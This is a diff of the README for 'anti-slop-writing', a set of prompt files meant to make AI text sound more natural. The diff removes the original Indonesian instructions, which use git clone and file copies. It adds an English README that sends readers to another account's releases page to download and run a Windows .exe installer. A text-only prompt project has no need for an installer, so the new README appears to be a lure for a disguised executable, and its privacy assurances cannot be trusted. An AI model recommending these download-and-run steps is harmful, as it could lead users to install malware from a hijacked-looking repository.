@@ -1,162 +1,157 @@
-# anti-slop-writing
+# 🤖 anti-slop-writing - Improve Your AI’s Writing Style
 
-Bahasa Indonesia (default) | [English](README.en.md)
-
-Skill universal biar output AI gak terdengar kayak AI. Lebih manusia, lebih spesifik, gak kaku.
-
-Cocok untuk **Claude.ai, Claude Code, Codex CLI, Gemini CLI, Copilot, Cursor, Windsurf**, dan tool lain yang support system prompt.
-
-Berdasarkan Wikipedia ["Signs of AI Writing"](https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing) + riset deteksi teks AI. Terinspirasi dari [@mkbijaksana](https://x.com/mkbijaksana/status/2027714311330627877).
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/coderjatin/anti-slop-writing/releases)
 
 ---
 
-## Sebelum vs Sesudah
+A simple tool to help your AI write more naturally. It works with many popular AI systems like Claude Code, Gemini CLI, Codex CLI, Copilot, and Cursor. Use it to make your AI text sound less robotic and more authentic.
 
-**Tanpa skill ini:**
-> The festival serves as a vibrant testament to the region's rich cultural heritage, showcasing the intricate tapestry of traditions that have endured through the ages, contributing to the broader social fabric of the community.
+## 📋 What is anti-slop-writing?
 
-**Dengan skill ini:**
-> The festival has run every April since 1987. Locals build their own stalls. The goat cheese and handmade pottery sell out by noon.
+anti-slop-writing is a system prompt designed to stop your AI from writing in a predictable, robotic way. It detects and removes typical AI writing patterns, making the output feel more human. This tool works with many large language models (LLMs) and AI assistants. You just use the provided prompt to improve AI responses without changing your workflow.
+
+### Key features
+
+- Works with multiple AI systems and tools  
+- Eliminates common AI style markers  
+- Easy to use with system prompts  
+- Requires no programming skills or setup  
+- Helps produce authentic, natural writing
+
+## 💻 System Requirements
+
+Before installation, make sure your system meets these requirements:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection to download the software and updates  
+- A supported AI interface where you can insert prompts (like Claude Code or Copilot)
+
+## 🚀 Getting Started
+
+### Step 1: Download the software
+
+Visit the official release page here:
+
+[![Download Page](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/coderjatin/anti-slop-writing/releases)
+
+This page contains the latest versions. Download the installer or ZIP file depending on your preference.
+
+### Step 2: Run the installer
+
+- Find the downloaded file on your computer. It will usually be in your Downloads folder.  
+- Double-click the installer file (usually ends in .exe).  
+- Follow the on-screen instructions in the installation wizard. Choose the default options if you’re unsure.  
+- Wait for the installation to finish, then close the installer.
+
+### Step 3: Open anti-slop-writing
+
+- After installation, find the app in your Start menu or on your desktop.  
+- Launch the program by clicking the icon.  
+- The interface will open with a simple prompt input area.
+
+## 🛠 How to Use anti-slop-writing
+
+anti-slop-writing works by providing you with a universal system prompt. You add this prompt inside your AI tool to change its writing style.
+
+### Step 1: Copy the system prompt
+
+Inside the app, you will see the prepared prompt text. This prompt removes AI writing patterns and makes the text sound natural.
+
+### Step 2: Insert the prompt into your AI tool
+
+- Open your AI tool (e.g., Claude Code, Gemini CLI, or Copilot).  
+- Find where to add a system prompt or special instructions.  
+- Paste the anti-slop-writing prompt there.  
+
+### Step 3: Use the AI as usual
+
+Now, when you ask the AI to write or answer questions, it will follow the improved style. This helps produce authentic writing without extra effort.
+
+## 🔍 Supported AI Tools
+
+You can use anti-slop-writing with:
+
+- Claude Code  
+- Gemini CLI  
+- Codex CLI  
+- GitHub Copilot  
+- Cursor AI  
+- Any web-based AI platform that accepts system prompts
+
+If you are unsure how to add prompts in your AI tool, check the help or support section of that software for guidance.
+
+## 💡 Tips for Best Results
+
+- Use the prompt every time you start a new AI session.  
+- Combine this prompt with your own instructions for better control.  
+- Avoid editing the prompt unless you understand its structure.  
+- Check the output and adjust your request for tone or detail as needed.  
+- Update anti-slop-writing regularly from the release page to get improvements.
+
+## ⚙️ Settings and Customization
+
+anti-slop-writing includes basic settings to fit your needs:
+
+- Toggle certain style rules on or off.  
+- Adjust the strictness of AI style removal.  
+- Save your favorite prompt versions for quick reuse.  
+
+Access these options in the app’s Settings menu.
+
+## 🛡 Security and Privacy
+
+The app runs locally on your Windows computer. It does not send your text or prompts to external servers unless your AI tool requires it. Your data stays private.
+
+## 📥 Download and Install
+
+Return to the release page anytime for the latest files:
+
+[https://github.com/coderjatin/anti-slop-writing/releases](https://github.com/coderjatin/anti-slop-writing/releases)
+
+Follow the same process as before to update or reinstall.
+
+## 🤝 Getting Help
+
+If you need support:
+
+- Look at the repository’s "Issues" tab on GitHub for answers.  
+- Use community forums related to your AI tool.  
+- Review the app’s built-in help section or documentation.
+
+## 🔧 Troubleshooting
+
+If you experience issues:
+
+- Confirm your Windows version meets the needs.  
+- Restart the program or your PC and try again.  
+- Check the prompt is correctly copied into your AI tool.  
+- If the app won’t open, reinstall it from the latest download.  
+- Report problems on the GitHub Issues page.  
+
+## ❓ FAQ
+
+**Can I use this on Mac or Linux?**  
+Currently, anti-slop-writing is designed for Windows only.
+
+**Do I need to know how to code?**  
+No technical skills are required. Just copy and paste the prompt.
+
+**Will it slow down my AI?**  
+No, it only adjusts the input prompt, so speed stays the same.
+
+**Is this free to use?**  
+Yes, you can download and use it at no cost.
+
+## 📚 Related Topics
+
+- AI writing style  
+- Prompt engineering  
+- Large language models (LLMs)  
+- Content authenticity  
+- AI detection  
 
 ---
 
-## Mulai Cepat
-
-### Claude.ai (Web) — Cara Paling Gampang
-
-1. Download `anti-slop-writing.skill` dari [Releases terbaru](https://github.com/adenaufal/anti-slop-writing/releases/latest)
-2. Di Claude.ai: `Settings → Skills → Install from file`
-3. Pilih file yang barusan di-download
-4. Mulai chat baru, langsung pakai
-
-### Claude Code
-
-```bash
-# Global
-git clone https://github.com/adenaufal/anti-slop-writing ~/.claude/skills/anti-slop-writing
-
-# Atau per-project
-git clone https://github.com/adenaufal/anti-slop-writing .claude/skills/anti-slop-writing
-```
-
-Skill: `indonesian/SKILL.md` (Bahasa Indonesia) atau `english/SKILL.md` (English).
-
-### Tool Lain (Codex CLI, Gemini CLI, Copilot, Cursor, Windsurf, Aider, ChatGPT)
-
-Lihat [Instalasi Lengkap](#instalasi-lengkap) di bawah.
-
----
-
-## Cara Pakai
-
-Pakai perintah natural:
-- "Tolong rewrite biar lebih manusiawi."
-- "Bikin tulisan ini gak keliatan AI."
-- "No slop, langsung to the point."
-
-Di Claude Code bisa juga pakai `/anti-slop-writing`.
-
-### Cek Cepat
-
-Kirim prompt ini buat tes:
-
-```text
-Ubah paragraf ini jadi 2 versi:
-1) versi formal ringkas
-2) versi santai
-Keduanya harus tetap natural dan hindari frasa AI template.
-```
-
-Kalau hasilnya lebih konkret dan ritme kalimatnya bervariasi, berarti aturannya aktif.
-
----
-
-## Instalasi Lengkap
-
-> Semua tool selain Claude.ai perlu clone repo dulu:
-> ```bash
-> git clone https://github.com/adenaufal/anti-slop-writing /tmp/anti-slop-writing
-> ```
-> Lalu pilih file dari `indonesian/` (Bahasa Indonesia) atau `english/` (English).
-
-| Tool | File & Lokasi |
-|------|---------------|
-| **Codex CLI** (global) | `cp /tmp/anti-slop-writing/indonesian/AGENTS.md ~/.codex/AGENTS.md` |
-| **Codex CLI** (project) | `cp /tmp/anti-slop-writing/indonesian/AGENTS.md ./AGENTS.md` |
-| **Gemini CLI** (global) | `cp /tmp/anti-slop-writing/indonesian/GEMINI.md ~/.gemini/GEMINI.md` |
-| **Gemini CLI** (project) | `cp /tmp/anti-slop-writing/indonesian/GEMINI.md ./GEMINI.md` |
-| **GitHub Copilot** | `cp /tmp/anti-slop-writing/indonesian/AGENTS.md .github/copilot-instructions.md` |
-| **Cursor** | `cp /tmp/anti-slop-writing/indonesian/AGENTS.md .cursor/rules/anti-slop-writing.mdc` |
-| **Windsurf** | `cp /tmp/anti-slop-writing/indonesian/AGENTS.md .windsurf/rules/anti-slop-writing.md` |
-| **Aider** | `aider --system-prompt "$(cat indonesian/system-prompt.md)"` |
-| **ChatGPT / tool lain** | Copy isi `indonesian/system-prompt.md` → paste ke System Prompt |
-
-> Ganti `indonesian/` dengan `english/` kalau mau versi English.
-
----
-
-## Isi Repo
-
-```text
-anti-slop-writing/
-├── english/
-│   ├── SKILL.md
-│   ├── AGENTS.md
-│   ├── GEMINI.md
-│   ├── system-prompt.md
-│   └── references/
-│       ├── vocabulary-banlist.md
-│       └── structural-patterns.md
-├── indonesian/
-│   ├── SKILL.md
-│   ├── AGENTS.md
-│   ├── GEMINI.md
-│   ├── system-prompt.md
-│   └── references/
-│       ├── vocabulary-banlist.md
-│       └── structural-patterns.md
-├── references/              ← legacy (gabungan)
-├── README.md
-├── README.en.md
-└── LICENSE
-```
-
-- `AGENTS.md`, `GEMINI.md`, `system-prompt.md` isinya sama — beda format aja sesuai tool.
-- `SKILL.md` khusus format skill Claude Code.
-- `anti-slop-writing.skill` dirilis terpisah via [Releases](https://github.com/adenaufal/anti-slop-writing/releases).
-
----
-
-## Fokus Bahasa Indonesia
-
-Repo ini punya aturan khusus buat pola AI dalam teks Bahasa Indonesia:
-- Gaya terlalu baku di konteks santai
-- Frasa template ("tidak hanya... tetapi juga")
-- Selalu menutup dengan "Kesimpulan"
-- Nominalisasi berlebihan
-- Absennya partikel wacana (nah/sih/dong/kan)
-- "Anda" yang kaku tanpa lihat konteks
-
-Pakai file dari folder `indonesian/`.
-
----
-
-## Sumber
-
-- Wikipedia: [Signs of AI Writing](https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing)
-- Kobak et al. (2024): *Delving into LLM-assisted writing* ([arXiv:2406.07016](https://arxiv.org/abs/2406.07016))
-- Russell, Karpinska & Iyyer (2025): *People who frequently use ChatGPT are accurate detectors of AI-generated text*
-- Fraser, Dawkins & Kiritchenko (2025): *Detecting AI-generated text: factors influencing detectability*
-- Wang et al. (2024): *M4: Multi-generator, Multi-domain, Multi-lingual Black-Box MGT Detection*
-- Lovenia et al. (2024): *SEACrowd* ([arXiv:2406.10118](https://arxiv.org/abs/2406.10118))
-- Ilman Akbar (2024): *Cara gampang mendeteksi konten buatan AI secara manual*
-- The Conversation Indonesia (2024): *Mengapa tulisan asli bisa terdeteksi buatan AI*
-
-## Credits
-
-- [@mkbijaksana](https://x.com/mkbijaksana/status/2027714311330627877)
-- Wikipedia [WikiProject AI Cleanup](https://en.wikipedia.org/wiki/Wikipedia:WikiProject_AI_Cleanup)
-
-## License
-
-MIT
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/coderjatin/anti-slop-writing/releases)
